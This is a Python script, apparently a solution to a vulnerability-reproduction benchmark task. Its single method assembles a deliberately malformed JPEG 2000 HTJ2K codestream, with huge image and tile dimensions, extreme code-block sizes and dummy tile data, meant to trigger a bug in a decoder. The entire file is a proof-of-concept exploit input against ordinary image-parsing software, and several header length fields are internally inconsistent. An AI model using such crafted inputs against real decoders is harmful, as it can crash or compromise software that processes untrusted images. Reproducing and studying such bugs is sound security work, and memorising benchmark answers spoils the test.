import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = bytearray()

        # SOC - Start of Codestream
        poc.extend(b'\xff\x4f')

        # SIZ - Image and Tile Size
        poc.extend(b'\xff\x51')
        poc.extend(b'\x00\x27')  # Lsiz = 39
        poc.extend(b'\x00\x00')  # Rsiz
        poc.extend(b'\x00\x01\x00\x00')  # Xsiz = 65536
        poc.extend(b'\x00\x01\x00\x00')  # Ysiz = 65536
        poc.extend(b'\x00\x00\x00\x00')  # XOsiz
        poc.extend(b'\x00\x00\x00\x00')  # YOsiz
        poc.extend(b'\x00\x01\x00\x00')  # XTsiz = 65536
        poc.extend(b'\x00\x01\x00\x00')  # YTsiz = 65536
        poc.extend(b'\x00\x00\x00\x00')  # XTOsiz
        poc.extend(b'\x00\x00\x00\x00')  # YTOsiz
        poc.extend(b'\x00\x01')  # Csiz = 1
        poc.extend(b'\x07')      # Ssiz_0 (8-bit unsigned)
        poc.extend(b'\x01')      # XRsiz_0
        poc.extend(b'\x01')      # YRsiz_0

        # COD - Coding Style Default
        poc.extend(b'\xff\x52')
        poc.extend(b'\x00\x0a')  # Lcod = 10
        poc.extend(b'\x20')      # Scod: HTJ2K enabled
        poc.extend(b'\x00\x00\x01\x00') # SGcod: LRCP, 1 layer, no MCT
        poc.extend(b'\x00')      # SPcod: 0 decomposition levels
        poc.extend(b'\xee')      # SPcod: cblk exponents (w_exp=16, h_exp=16) -> w,h=65536
        poc.extend(b'\x40')      # SPcod: cblk style
        poc.extend(b'\x01')      # SPcod: 5-3 reversible transform

        # QCD - Quantization Default
        poc.extend(b'\xff\x5c')
        poc.extend(b'\x00\x05')  # Lqcd = 5
        poc.extend(b'\x00')      # Sqcd: No quantization
        poc.extend(b'\x00\x00')  # SPqcd

        # SOT - Start of Tile-part
        poc.extend(b'\xff\x90')
        poc.extend(b'\x00\x0a')  # Lsot = 10
        poc.extend(b'\x00\x00')  # Isot = 0
        poc.extend(b'\x00\x00\x00\x12') # Psot = 18 (SOT marker(12) + SOD(2) + data(4))
        poc.extend(b'\x00')      # TPsot = 0
        poc.extend(b'\x01')      # TNsot = 1

        # SOD - Start of Data
        poc.extend(b'\xff\x93')

        # Minimal tile data to trigger decoding attempt
        poc.extend(b'\xde\xad\xbe\xef')

        # EOC - End of Codestream
        poc.extend(b'\xff\xd9')

        return bytes(poc)